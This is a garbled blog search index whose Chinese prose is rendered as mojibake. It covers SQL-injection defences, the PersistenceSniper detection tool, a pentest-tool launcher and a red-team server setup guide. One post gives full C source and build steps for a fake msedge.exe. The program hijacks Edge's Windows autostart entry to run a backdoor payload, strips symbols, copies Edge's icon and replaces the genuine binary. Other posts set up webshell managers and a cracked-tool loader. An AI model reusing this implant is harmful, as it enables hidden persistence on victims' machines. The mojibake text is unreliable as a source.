å°„åˆ°æ•°æ®åº“ä¸­çš„å…³ç³»è¡¨ï¼Œä»è€Œå‡å°‘äº†ç›´æ¥ä½¿ç”¨SQLæŸ¥è¯¢çš„éœ€è¦ã€‚ORMæ¡†æ¶é€šå¸¸ä¼šè‡ªåŠ¨è¿›è¡Œå‚æ•°åŒ–æŸ¥è¯¢å’Œç¼–ç ï¼Œä»è€Œé¿å…äº†SQLæ³¨å…¥æ”»å‡»çš„é—®é¢˜ã€‚ é™åˆ¶é”™è¯¯ä¿¡æ¯ï¼šä¸è¦åœ¨Webåº”ç”¨ç¨‹åºä¸­å‘ç”¨æˆ·å…¬å¼€è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™äº›é”™è¯¯ä¿¡æ¯æ¥å‘ç°æ¼æ´å’Œæ”»å‡»ç‚¹ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæ”»å‡»ã€‚åº”è¯¥é€šè¿‡ä½¿ç”¨è‡ªå®šä¹‰çš„é”™è¯¯æ¶ˆæ¯æ¥æ›¿ä»£é€šç”¨çš„é”™è¯¯æ¶ˆæ¯ï¼Œä»è€Œé™åˆ¶é”™è¯¯ä¿¡æ¯çš„å…¬å¼€ã€‚ å®šæœŸæ›´æ–°æ•°æ®åº“ï¼šåœ¨æ›´æ–°æ•°æ®åº“ä¹‹å‰ï¼Œåº”è¯¥å¯¹æ–°æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„éªŒè¯å’Œè¿‡æ»¤ï¼Œä»è€Œç¡®ä¿å®ƒä»¬ç¬¦åˆé¢„æœŸçš„æ ¼å¼å’Œç±»å‹ï¼Œå¹¶ä¸”ä¸åŒ…å«æ¶æ„çš„ä»£ç ã€‚ å®šæœŸè¿›è¡Œå®‰å…¨æ¼æ´æ‰«æå’Œæ¸—é€æµ‹è¯•ï¼ŒåŠæ—¶å‘ç°å’Œä¿®å¤æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚ é‡‡ç”¨æœ€å°æƒé™åŸåˆ™ï¼Œå‡å°‘æ•°æ®åº“ç”¨æˆ·çš„æƒé™ï¼Œä»è€Œé™åˆ¶æ”»å‡»è€…å¯¹æ•°æ®åº“çš„æ“ä½œã€‚ å®šæœŸæ›´æ–°åº”ç”¨ç¨‹åºå’Œæ•°æ®åº“è½¯ä»¶ï¼ŒåŠæ—¶ä¿®è¡¥å®‰å…¨æ¼æ´ï¼Œå‡å°‘è¢«æ”»å‡»çš„é£é™©ã€‚ åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨åŠ å¯†ä¼ è¾“æŠ€æœ¯ï¼Œä¾‹å¦‚SSL/TLSï¼Œä»è€Œä¿æŠ¤ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ•°æ®å®‰å…¨ã€‚ ç›‘æ§åº”ç”¨ç¨‹åºçš„è®¿é—®æ—¥å¿—ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸è®¿é—®å’Œæ“ä½œï¼Œé‡‡å–ç›¸åº”çš„å®‰å…¨æªæ–½ã€‚ ","link":"https://Zer0-hex.github.io/aAfFAptwJ/"},{"title":"åˆ©ç”¨ msedge.exe è‡ªå¯åŠ¨ç»´æƒ","content":" åœ¨åˆ©ç”¨PersistenceSniperå·¥å…·è‡ªåŠ¨åŒ–æŸ¥è¯¢æ¶æ„è½¯ä»¶æŒä¹…åŒ–æ“ä½œæ—¶ï¼Œå‘ç° Windows10ã€Windows11 è‡ªå¸¦è¿™ä¸ª Edge é¢„åŠ è½½çš„è‡ªå¯åŠ¨ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ä¸€æ³¢ã€‚ æµç¨‹å¤§è‡´å¦‚ä¸‹ ç”¨ C ç®€å•å†™ä¸€ä¸ª #pragma comment( linker, &quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot; ) // éšè—æ§åˆ¶å° #include&lt;string.h&gt; #include&lt;windows.h&gt; #define FILENAME &quot;msedge.exe&quot; #define DIR &quot;.\\\\*&quot; void backdoor(); char *get_msedge_path(char *dir); int main(int argc, char **argv) { if (argc &lt; 3 || strcmp(argv[1], &quot;--no-startup-window&quot;) || strcmp(argv[2], &quot;--win-session-start&quot;)) { char *msedgePath = NULL; msedgePath = get_msedge_path(DIR); system(msedgePath); } else { backdoor(); } return 0; } void backdoor() { // Input Your Code system(&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;); } char *get_msedge_path(char *dir) { int flag, length; char *dirName = NULL; WIN32_FIND_DATA p, pp; HANDLE h = FindFirstFile(dir, &amp;p); flag = 0; do { if (p.dwFileAttributes == 16) { dirName = p.cFileName; length = strlen(dirName); strcpy(dirName+length, &quot;\\\\*\\x00&quot;); HANDLE hh = FindFirstFile(dirName, &amp;pp); do { if (!strcmp(pp.cFileName, FILENAME)) { flag = 1; } } while(flag == 0 &amp;&amp; FindNextFile(hh,&amp;pp)); } } while(flag == 0 &amp;&amp; FindNextFile(h,&amp;p)); static char filePath[1024]; strcpy(filePath, &quot;start /b .\\\\&quot;); length = strlen(filePath); strcpy(filePath+length, dirName); length = strlen(filePath); strcpy(filePath+length-1, pp.cFileName); return filePath; } ç¼–è¯‘æµ‹è¯• gcc msedge.c -o msedge.exe # å¤åˆ¶åˆ° C:\\Program Files (x86)\\Microsoft\\Edge\\Application ç›®å½•ä¸‹æ›¿æ¢ # è¿è¡Œæµ‹è¯• msedge.exe msedge.exe --no-startup-window --win-session-start /prefetch:5 æ·»åŠ å›¾æ ‡ ç”¨ 7z-zip æ‰“å¼€ msedge.exe å¯ä»¥æŠŠé‡Œé¢çš„ ico æ‹¿å‡ºæ¥ï¼Œç‰ˆæœ¬å·å¯èƒ½ä¸ä¸€æ ·ï¼Œä½†éƒ½å¯ä»¥ç”¨ã€‚ æºä»£ç åŒç›®å½•åˆ›å»ºä¸€ä¸ª logo.rc æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ logo ICON &quot;logo.ico&quot; æŠŠä» msedge.exe é‡Œæ‹¿å‡ºæ¥çš„ ico æ–‡ä»¶ä¸€èµ·æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ï¼Œå¹¶ä¿®æ”¹åç§° msedge.c logo.rc logo.ico ç¼–è¯‘ # ç¼–è¯‘å›¾æ ‡ windres.exe logo.rc logo.o # ç¼–è¯‘ exe åˆ é™¤ä¿¡æ¯å¹¶ä¸”æœ€å°åŒ–ç¼–è¯‘ï¼Œå…³é—­äº†æ ˆä¿æŠ¤ gcc -s -Os -fomit-frame-pointer -fno-stack-protector msedge.c logo.o -o msedge.exe ç°åœ¨å°±å¾ˆå®Œç¾äº† ","link":"https://Zer0-hex.github.io/JpFlp8CjR/"},{"title":"Windows æƒé™ç»´æŒè‡ªåŠ¨åŒ–æ£€æµ‹å·¥å…·","content":" PersistenceSniper æ˜¯ä¸€æ¬¾é’ˆå¯¹ Windows ç¯å¢ƒç³»ç»Ÿå±‚é¢æƒé™ç»´æŒæŠ€æœ¯çš„è‡ªåŠ¨åŒ–æ£€æµ‹å·¥å…·ï¼Œé€‚åˆåº”æ€¥å“åº”æ—¶å¿«é€Ÿæ¸…é™¤ç›®æ ‡ã€‚ ä½¿ç”¨æ–¹æ³• å¼€å¯ PS æ‰§è¡Œæƒé™ # æŸ¥çœ‹æƒé™æƒ…å†µ PS C:\\&gt; Get-ExecutionPolicy -List Scope ExecutionPolicy ----- --------------- MachinePolicy Undefined UserPolicy Undefined Process Undefined CurrentUser Undefined LocalMachine Undefined # ä¿®æ”¹æƒé™ä¸º: RemoteSigned # è¿è¡Œæœ¬åœ°çš„è„šæœ¬ä¸éœ€è¦æ•°å­—ç­¾åï¼Œä½†æ˜¯è¿è¡Œä»ç½‘ç»œä¸Šä¸‹è½½çš„è„šæœ¬å°±å¿…é¡»è¦æœ‰æ•°å­—ç­¾åï¼› PS C:\\&gt; Set-ExecutionPolicy RemoteSigned # æå®Œåˆ«å¿˜äº†å¸®åˆ«äººå…³æ‰ # ä¿®æ”¹æƒé™ä¸º: Undefined # æ”¹ä¸ºé»˜è®¤è®¾ç½®ï¼Œä¸€èˆ¬ç”¨æ¥åˆ é™¤æ‰§è¡Œæƒé™ PS C:\\&gt; Set-ExecutionPolicy Undefined åŠ è½½è„šæœ¬ï¼Œå¯åŠ¨ PS C:\\&gt; Import-Module .\\PersistenceSniper.psd1 # åŠ è½½ PS PS C:\\&gt; Get-Help -Name Find-AllPersistence -Full # è·å–å¸®åŠ©, æ²¡æœ‰ä¸­æ–‡ PS C:\\&gt; Find-AllPersistence # æ— å‚æ•°é»˜è®¤è¾“å‡ºå…¨éƒ¨æŒä¹…åŒ–ç¨‹åº PS C:\\&gt; Find-AllPersistence -PersistenceMethod [TAB] # è¾“å‡ºå•ä¸ªæŒä¹…åŒ–æŠ€æœ¯ç›¸å…³çš„ç¨‹åºï¼Œå¯ä»¥ç”¨ [TAB] é”®è¡¥å…¨ PS C:\\&gt; Find-AllPersistence | Out-GridView # GUI çš„è¡¨è¿›è¡Œäº¤äº’ï¼Œçœ‹ä¸Šå»èˆ’æœç‚¹ PS C:\\&gt; Find-AllPersistence -DiffCSV false_positives.csv # è¾“å‡ºåˆ° CSV æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸ç°æœ‰çš„ CSV æ–‡ä»¶å¯¹æ¯”å·®å¼‚ PS C:\\&gt; Find-AllPersistence -PersistenceMethod RunAndRunOnce # ä»…è·å– Run å’Œ RunOnce æ³¨å†Œè¡¨é¡¹æ¤å…¥çš„æŒä¹…åŒ–ç¨‹åº PS C:\\&gt; Find-AllPersistence | Where-Object &quot;Access Gained&quot; -EQ &quot;System&quot; # åªæŸ¥çœ‹ä»¥ NT AUTHORITY\\SYSTEM æƒé™è¿è¡Œçš„æŒä¹…åŒ–ç¨‹åº æœ¬åœ°æµ‹è¯•ä¸€æ³¢ PS C:\\&gt; Import-Module .\\PersistenceSniper.psd1 PS C:\\&gt; Find-AllPersistence Hostname : DESKTOP-UA6KPR1 Technique : Registry Run Key Classification : MITRE ATT&amp;CK T1547.001 Path : HKEY_USERS\\S-1-5-21-3069013648-1080194048-1350301826-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\R un\\MicrosoftEdgeAutoLaunch_BE49816B256B0FD155BC7BFC16CF6BDB Value : &quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&quot; --no-startup-window --win-session-start /prefetch:5 Access Gained : User Note : Executables in properties of the key (HKLM|HKEY_USERS\\&lt;SID&gt;)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersio n\\Run are run when the user logs in. Reference : https://attack.mitre.org/techniques/T1547/001/ Signature : Status = Valid, Subject = CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US IsBuiltinBinary : False IsLolbin : False è¿™ä¸ª Edge é¢„åŠ è½½æ˜¯ Windows10ã€Windows11 è‡ªå¸¦çš„ï¼Œå½“ç„¶ä¸æ’é™¤ EXE è¢«æ›¿æ¢çš„å¯èƒ½ã€‚ ","link":"https://Zer0-hex.github.io/aEFrVllwS/"},{"title":"NNZ ä¸€æ¬¾æ¨¡å—åŒ–é€šç”¨GUIç•Œé¢","content":"NNZ é‡ä¿çš„å‘Šè­¦æ•°é‡è¿˜å¯ä»¥ï¼Œå†™å†™å·¥å…·ï¼Œçœ‹çœ‹S12å…¨çƒæ€»å†³èµ›ï¼Œæ…¢æ…¢é•¿å¤œå¾ˆå¿«å°±è¿‡å»äº†ã€‚ ç®€ä»‹ ä¸€æ¬¾æ¨¡å—åŒ–å·¥å…·ï¼Œå¯ä»¥ä¸ºå‘½ä»¤è¡Œå·¥å…·æä¾›é€šç”¨GUIç•Œé¢ã€‚è®©ä½ æ‹¥æœ‰è‡ªå·±å–œæ¬¢çš„å·¥å…·åŒ…ã€‚ä¸è®ºæ˜¯åœ¨è™šæ‹Ÿæœºé‡Œï¼è¿˜æ˜¯è£…åœ¨Uç›˜é‡Œï¼éƒ½å¯å³æ’å³ç”¨ï¼ æŠ€æœ¯æ ˆï¼šPython + tkinter + toml [+] åŠŸèƒ½å®Œå–„åå†å¼€æº å¦å¤–ï¼Œä½œä¸ºä¸€ä¸ªLinuxerï¼Œæˆ‘è¿˜æ˜¯å¾ˆå–œæ¬¢ç»ˆç«¯ç•Œé¢çš„ğŸ¤­ ä¸‰ä¸ªå¥½å¤„ å¥½å¿ƒæƒ…ï¼šåœ¨è‚¾é€å•è§†æˆ–è€…æ”»é˜²æ¼”ç»ƒçš„æ—¶å€™ï¼Œæ‰“å¼€å„ç§ç»ˆç«¯çª—å£ï¼Œç„¶åæ•´ä¸ªç”µè„‘ä¹±çš„ä¸€æ‰¹ï¼Œå¾ˆè®©äººçƒ¦èºï¼ŒNNZå¯ä»¥å‡è½»ä½ åœ¨è¿™æ–¹é¢çš„ç—›è‹¦ã€‚ å¥½ç®€å•ï¼šå¯¹äºå°ç™½æ¥è¯´ï¼Œå¾ˆå¤šå·¥å…·ä¸ä¼šç”¨ï¼Œä¸å¥½å­¦ï¼Œæœ‰äº†å‰è¾ˆå†™å¥½çš„é…ç½®æ–‡ä»¶ï¼Œæ‹¿æ¥å¯ä»¥ç›´æ¥æ¢­å“ˆäº†ã€‚ å¥½æ–¹ä¾¿ï¼šæœ‰ä¸€å¤©ä½ ä¸å°å¿ƒè¿è¡Œäº†ä¸€ä¸ªexeï¼Œå‘ç°ä¸­æ‹›äº†ï¼Œè¿™ä¸ªæ—¶å€™ç”µè„‘ä¸å¹²å‡€äº†ï¼Œä½ å·¦æ€å³æƒ³è¿˜æ˜¯é€‰æ‹©äº†é‡è£…ç³»ç»Ÿï¼ŒTAå¯ä»¥è®©ä½ ä¸€å°æ—¶æ¢å¤å·¥ä½œçŠ¶æ€ã€‚ ä¸»è¦åŠŸèƒ½ å¯åŠ¨å™¨ (æŠŠå…¶ä»–æœ‰GUIç•Œé¢çš„å·¥å…·é›†æˆä¸€ä¸‹) éšä¾¿åŠ äº†å‡ ä¸ªå·¥å…·ï¼Œæ²¡åˆ«çš„æ„æ€ â€‹ æ¸—é€å°å·¥å…· (ç°åœ¨è¿˜ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç‰›å¥¶ä¼šæœ‰çš„ï¼Œé¢åŒ…ä¹Ÿä¼šæœ‰çš„) â€‹ å‘½ä»¤è¡Œå·¥å…· (é€šç”¨GUIç•Œé¢ï¼Œåªéœ€è¦å†™ä¸€ä»½æå…¶ç®€å•çš„é…ç½®æ–‡ä»¶å³å¯ï¼Œæ‘†è„±äº†åœ¨å‘½ä»¤è¡Œé‡Œé¢åˆ‡æ¢å„ç§ç›®å½•çš„ç¹çã€‚) â€‹ Downloadï¼šGithub ç›®å½•ä¸ä½¿ç”¨è¯´æ˜ åŠ ç²—éƒ¨åˆ†æ¯”è¾ƒé‡è¦ã€‚ NNZ/ NNZ.exe res/ env/ python3/ python.exe java8/ bin/ java.exe javaw.exe env.toml images/ logo.png icon.png runs/ BurpSuite/ BurpSuite.bat BurpSuite.png */ SecLists/ simple_tools/ terminal_tools/ dirsearch/ dirsearch.py dirsearch.toml fscan/ fscan.exe fscan.toml gobuster dir/ gobuster.exe gobuster dir.toml gobuster dns/ gobuster.exe gobuster dns.toml è¯¦ç»†ä»‹ç» NNZ/res/env/toml # ç”¨äºè®°è½½ä¾¿æºå¼ç¯å¢ƒçš„ä½ç½®,ä¸»è¦ä¸ºterminal_toolsæä¾›ç´¢å¼•, ç»ˆç«¯å·¥å…·ä¸­æœ‰ä¸€äº›æ—¶exeæ–‡ä»¶ï¼Œæ‰€ä»¥åŠ ä¸ªNone=''è¡¨ç¤ºçˆ¶è¿›ç¨‹ä¸ºç©ºã€‚ # æ­¤æ–‡ä»¶å¿…é¡»å­˜åœ¨ java8 = &quot;res/env/jdk8/bin/java.exe&quot; java11 = &quot;res/env/jdk11/bin/java.exe&quot; python2 = &quot;res/env/python2/python.exe&quot; python3 = &quot;res/env/python3/python.exe&quot; None = '' NNZ/res/runs/BurpSuite/ # æ‹¿BurpSuiteä¸¾ä¸ªæ —å­ NNZ/res/runs/BurpSuite/BurpSuite.bat NNZ/res/runs/BurpSuite/BurpSuite.png NNZ/res/runs/BurpSuite/BurpSuite.jar # æ·»åŠ å¯åŠ¨å™¨çš„æ–¹æ³•å¾ˆç®€å•ï¼š 1.åœ¨NNZ/res/runs/ ç›®å½•ä¸‹é¢æ–°å»ºæ–‡ä»¶å¤¹: [name]/ï¼› 2.åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºåŒå: [name].bat æ–‡ä»¶ï¼› 3.åœ¨æ–‡ä»¶å¤¹ä¸‹æ·»åŠ å›¾æ ‡æ–‡ä»¶ [name].png å¿…é¡»æ˜¯pngæ ¼å¼ï¼› 4.ç¼–å†™batæ–‡ä»¶ï¼Œç¡®ä¿åŒå‡»batæ–‡ä»¶å¯ä»¥è¿è¡Œå·¥å…·ã€‚ BurpSuite.bat ------------- cd /d %~dp0 start /B javaw.exe -Xmx8G -XX:-UseParallelGC -noverify -javaagent:BurpSuiteLoader.jar -Dfile.encoding=utf-8 -jar BurpSuite.jar ------------- # è¿™é‡Œç”¨javaw.exeè¿è¡Œï¼Œå¯ä»¥è‡ªåŠ¨åˆ›å»ºæ–°è¿›ç¨‹ï¼Œä¸NNZ.exeè¿›ç¨‹åˆ†ç¦»ï¼Œç›´æ¥æŠŠå·¥å…·çš„java.exeæ¢æˆjavaw.exeå°±è¡Œï¼ŒPythonå¯¹åº”çš„ä¹Ÿæœ‰pythonw.exeã€‚ # åŒæ—¶ä¹Ÿå¯ä»¥ç”¨äºå¯åŠ¨.jar .py .exe ..... å„ç§ç±»å‹çš„ç¨‹åºï¼Œåªè¦åŒå‡»batèƒ½è¿è¡Œå°±å¯ã€‚ # exeç±»å‹å¯ä»¥ç”¨ä¸‹é¢çš„è¿™ç§æ ¼å¼ Clash.bat ---------- cd /d %~dp0 start /b &quot;Clash&quot; &quot;Clash for Windows.exe&quot; ---------- # ç¯å¢ƒä¹Ÿå¯ä»¥ç”¨è‡ªå·±æ·»åŠ çš„ç¯å¢ƒï¼Œè¿™æ ·æ–¹ä¾¿æ„å»ºè‡ªå·±çš„å·¥å…·åŒ… Godzilla.bat ---------- cd /d %~dp0 Start /b ../../env/jdk11/bin/javaw.exe -jar godzilla.jar ---------- # ä¹Ÿå¯ä»¥åœ¨æ–‡ä»¶å¤¹ä¸‹é¢è°ƒç”¨å­æ–‡ä»¶å¤¹çš„exeæ–‡ä»¶ AntSword.bat ---------- cd /d %~dp0 start /b &quot;AntSword&quot; &quot;AntSword-Loader/AntSword.exe&quot; ---------- SecLists/ # å­—å…¸æ–‡ä»¶ï¼Œä¸»è¦ä¸ºå…¶ä»–å·¥å…·æä¾›å­—å…¸ï¼Œä¸ªäººå¸¸ç”¨çš„å­—å…¸ä¸»è¦æ˜¯ https://github.com/danielmiessler/SecLists simple_tools/ # è¿™ä¸ªæ˜¯æ¸—é€å°å·¥å…·ç•Œé¢çš„ç›®å½•ï¼Œæš‚æ—¶è¿˜æ²¡å¼€å‘ï¼Œå…ˆç•™ç€ã€‚ terminal_tools/ # ç»ˆç«¯å·¥å…·ç›®å½•, ä¸¾å‡ ä¸ªæ —å­ - terminal_tools/dirsearch/ - dirsearch.py - dirsearch.toml * - * æœ€ä¸»è¦çš„å°±æ˜¯è¿™ä¸ªdirsearch.tomlæ–‡ä»¶ï¼Œä¸€å®šè¦å’Œç›®å½•åŒåï¼Œå› ä¸ºç¨‹åºæ˜¯é€šè¿‡ç›®å½•åç´¢å¼•çš„ã€‚ è‹¥ç›®å½•åä¸º: gobuster dir åˆ™é…ç½®æ–‡ä»¶å: gobuster dir.toml ç©ºæ ¼ä¹Ÿè¦å¸¦ä¸Š æ–‡ä»¶å†…å®¹å°±æ˜¯ç»™ç¨‹åºå†™ä¸€ä»½æ–‡æ¡£: name: å·¥å…·åç§°ï¼Œç›´æ¥æ˜¾ç¤ºåœ¨GUIç•Œé¢æ ‡ç­¾ä¸Š pname: è¿è¡Œå·¥å…·éœ€è¦çš„å­—ç¬¦ä¸² ppname: è¿è¡Œå·¥å…·æ‰€éœ€è¦çš„ç¯å¢ƒï¼Œè¿™é‡Œçš„ç¯å¢ƒä¸æ˜¯æœ¬æœºçš„ç¯å¢ƒï¼Œæ˜¯é€šè¿‡NNZ/res/env/env.tomlæ–‡ä»¶è·å–åˆ°çš„å¯¹åº”ç¯å¢ƒè·¯å¾„ã€‚ å‚æ•°åˆ†ä¸ºä¸‰ç§must_args(å¿…é¡»å‚æ•°)ã€nomust_noinput_args(å¯é€‰é€‰é¡¹å‚æ•°)ã€nomust_input_args(å¯é€‰è¾“å…¥å‚æ•°) [[must_args]] # å¿…é¡»å‚æ•° arg_name = &quot;-u &quot; # å‚æ•°ï¼Œæ³¨æ„-uåé¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨äºæ‹¼æ¥ã€‚è¿™æ ·è®¾è®¡çš„åŸå› æ˜¯æœ‰äº›å‚æ•°æ²¡æœ‰ç©ºæ ¼æ¯”å¦‚: --exclude-size=2kb arg_more = &quot;æ·»åŠ ç›®æ ‡url&quot; # å‚æ•°ä»‹ç»ï¼Œåœ¨GUIç•Œé¢ç»™äººçœ‹çš„ï¼Œéšä¾¿å†™ä½†æ˜¯ä¸è¦å†™å¤ªé•¿äº†ã€‚ arg_text = &quot;https://127.0.0.1&quot; # å‚æ•°é»˜è®¤å€¼ arg_enable = true # é»˜è®¤æ˜¯å¦å¯ç”¨ [[nomust_noinput_args]] # å¯é€‰é€‰é¡¹å‚æ•° arg_name = &quot;-q &quot; # å‚æ•°ï¼Œæ³¨æ„-qåé¢åŠ ä¸€ä¸ªç©ºæ ¼ arg_more = &quot;[å¿…é¡»å¼€å¯]å®‰é™æ¨¡å¼&quot; # å‚æ•°ä»‹ç»ï¼Œï¼ˆä¸€èˆ¬è¦å…³é—­æ»šåŠ¨æ¡ï¼Œå¦åˆ™æ˜¾ç¤ºä¼šå¾ˆä¹±ï¼‰ arg_enable = true # é»˜è®¤æ˜¯å¦å¯ç”¨ [[nomust_input_args]] # å¯é€‰è¾“å…¥å‚æ•° arg_name = &quot;-x &quot; # å‚æ•°ï¼Œæ³¨æ„-xåé¢åŠ ä¸€ä¸ªç©ºæ ¼ arg_more = &quot;è¿‡æ»¤çŠ¶æ€ç &quot; # å‚æ•°ä»‹ç» arg_text = &quot;404,502,301&quot; # å‚æ•°é»˜è®¤å€¼ arg_enable = true # é»˜è®¤æ˜¯å¦å¯ç”¨ ä»¥ä¸‹ä¸ºdirsearch.tomlçš„é…ç½®æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰å†™å‡ºæ‰€æœ‰åŠŸèƒ½ï¼Œæš‚æ—¶åªæ˜¯è®°å½•äº†å¸¸ç”¨åŠŸèƒ½ --------------------- name = &quot;dirsearch&quot; pname = &quot;dirsearch.py&quot; ppname = &quot;python3&quot; # è¿è¡Œçš„æ—¶å€™é€šè¿‡env.tomlæ–‡ä»¶è·å–ç¯å¢ƒè·¯å¾„python3 = &quot;res/env/python3/python.exe&quot; [[must_args]] arg_name = &quot;-u &quot; arg_more = &quot;æ·»åŠ ç›®æ ‡url&quot; arg_text = &quot;https://127.0.0.1&quot; arg_enable = true [[nomust_noinput_args]] arg_name = &quot;-q &quot; arg_more = &quot;[å¿…é¡»å¼€å¯]å®‰é™æ¨¡å¼&quot; arg_enable = true [[nomust_noinput_args]] arg_name = &quot;-r &quot; arg_more = &quot;é€’å½’æ‰«æ&quot; arg_enable = false [[nomust_input_args]] arg_name = &quot;-x &quot; arg_more = &quot;è¿‡æ»¤çŠ¶æ€ç &quot; arg_text = &quot;404,502,301&quot; arg_enable = true [[nomust_input_args]] arg_name = &quot;--exclude-size=&quot; # å‚æ•°åŠ ç©ºæ ¼çš„ç½ªé­ç¥¸é¦– arg_more = &quot;è¿‡æ»¤æŒ‡å®šå¤§å°è¿”å›åŒ…&quot; arg_text = &quot;2KB&quot; arg_enable = true [[nomust_input_args]] arg_name = &quot;-w &quot; arg_more = &quot;é€‰æ‹©å­—å…¸&quot; arg_text = &quot;res/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt&quot; # é»˜è®¤çš„å­—å…¸ä½ç½®ï¼Œå¾ˆæ–¹ä¾¿çš„ã€‚ arg_enable = false --------------------- # å¯¹äºgobusterè¿™ç±»å·¥å…·ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é€‰æ‹©åŠŸèƒ½æ¨¡å—ï¼Œé‚£ä¹ˆå°†å…¶å„ä¸ªåŠŸèƒ½åˆ†å¼€å•ç‹¬åˆ›å»ºæ–‡ä»¶å¤¹ æ¯”å¦‚ä»¥ä¸‹ä¸¤ä¸ªç›®å½•ï¼š gobuster dir/ gobuster dns/ å…¶ä¸­çš„exeæ–‡ä»¶å‘½åå¯ä»¥ä¸æ›´æ”¹: gobuster.exe åœ¨é…ç½®æ–‡ä»¶ä¸­å°†pname = &quot;gobuster.exe&quot;æ›´æ”¹ä¸ºï¼š pname = &quot;gobuster.exe dir&quot;ã€ pname = &quot;gobuster.exe dns&quot; å³å¯ã€‚ å‡ ä»½ç°æœ‰çš„é…ç½®æ–‡ä»¶ï¼Œä»…ä¾›å‚è€ƒ res/terminal_tools/dirsearch/dirsearch.toml res/terminal_tools/fscan/fscan.toml res/terminal_tools/ehole/ehole.toml (è¯¥ç‰ˆæœ¬æ˜¯Githubä¸Šé¢æ‹‰ä¸‹æ¥æœ€æ–°ä»£ç è‡ªè¡Œæ„å»ºçš„) res/terminal_tools/gobuster dir/gobuster dir.toml res/terminal_tools/gobuster dns/gobuster dns.toml ","link":"https://Zer0-hex.github.io/nnz-yi-kuan-mo-kuai-hua-tong-yong-gui-jie-mian/"},{"title":"äº‘æœåŠ¡å™¨éƒ¨ç½²","content":"äº‘æœåŠ¡å™¨éƒ¨ç½² å½“ä½ è´­ä¹°æˆ–è€…ç™½å«–ä¸€å°äº‘æœåŠ¡å™¨æ—¶ï¼Œä½ éœ€è¦åšä»¥ä¸‹åŠ¨ä½œ (Debian 11) åŸºæœ¬è®¾ç½® Base # apt update &amp;&amp; apt upgrade # apt install zip tmux man git curl unzip perl wget ranger python openjdk-11-jdk openjdk-11-jdk-headless # apt install nmap sqlmap # å¢åŠ 2Gè™šæ‹Ÿå†…å­˜ # dd if=/dev/zero of=/swapfile2 bs=1M count=2048 # chmod 0600 /swapfile2 # mkswap /swapfile2 # swapon /swapfile2 # sysctl vm.swappiness=60 # echo '/swapfile2 swap swap defaults' &gt;&gt; /etc/fstab å¼€å‘ç¯å¢ƒ $ mkdir ~/Github $ mkdir ~/Downloads $ pip config set global.index-url https://mirrors.bfsu.edu.cn/pypi/web/simple $ python3 -m pip install pip --upgrade $ cd ~/Downloads $ wget https://golang.google.cn/dl/go1.18.6.linux-amd64.tar.gz $ sudo rm -rf /usr/local/go &amp;&amp; sudo tar -C /usr/local -xzf go1.18.6.linux-amd64.tar.gz $ echo &quot;export PATH=\\$PATH:/usr/local/go/bin&quot; &gt;&gt; ~/.bashrc Docker $ sudo apt remove docker docker-engine docker.io containerd runc $ sudo apt update $ sudo apt install apt-transport-https ca-certificates gnupg2 software-properties-common $ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add - $ sudo apt-key fingerprint 0EBFCD88 $ sudo add-apt-repository &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.bfsu.edu.cn/docker-ce/linux/debian $(lsb_release -cs) stable&quot; $ sudo apt update $ sudo apt install docker-ce docker-ce-cli containerd.io $ sudo usermod -aG docker `whoami` $ pip install docker-compose $ reboot vim $ git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime $ sh ~/.vim_runtime/install_awesome_vimrc.sh tmux $ cd $ git clone https://github.com/gpakosz/.tmux.git $ ln -s -f .tmux/.tmux.conf $ cp .tmux/.tmux.conf.local . æ¸—é€ç¯å¢ƒéƒ¨ç½² èµ„äº§ç®¡ç†ç³»ç»Ÿ (ARL) $ cd ~/Github $ git clone https://github.com/TophantTechnology/ARL.git $ cd ARL/docker/ $ docker volume create arl_db $ docker-compose pull $ docker-compose up -d cd ~/Github &amp;&amp; git clone https://github.com/TophantTechnology/ARL.git &amp;&amp; cd ARL/docker/ &amp;&amp; docker volume create arl_db &amp;&amp; docker-compose pull &amp;&amp; docker-compose up -d è¿™é‡Œæˆ‘æ¯”è¾ƒå–œæ¬¢æŠŠæ˜ å°„çš„443ç«¯å£æ”¹ä¸º5003ç«¯å£ï¼Œå› ä¸º443è¦ç•™ç»™CobaltStrike(æ»‘ç¨½)ã€‚ Vipser # è®¾ç½®å®‰è£…ç›®å½• $ export VIPER_DIR=~/Github/Viper $ mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR $ tee docker-compose.yml &lt;&lt;-'EOF' version: &quot;3&quot; services: viper: image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest container_name: viper-c network_mode: &quot;host&quot; restart: always volumes: - ${PWD}/loot:/root/.msf4/loot - ${PWD}/db:/root/viper/Docker/db - ${PWD}/module:/root/viper/Docker/module - ${PWD}/log:/root/viper/Docker/log - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig command: [&quot;VIPER_PASSWORD&quot;] EOF $ export VIPER_PASSWORD=Zer0-hex $ sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml $ docker-compose config $ 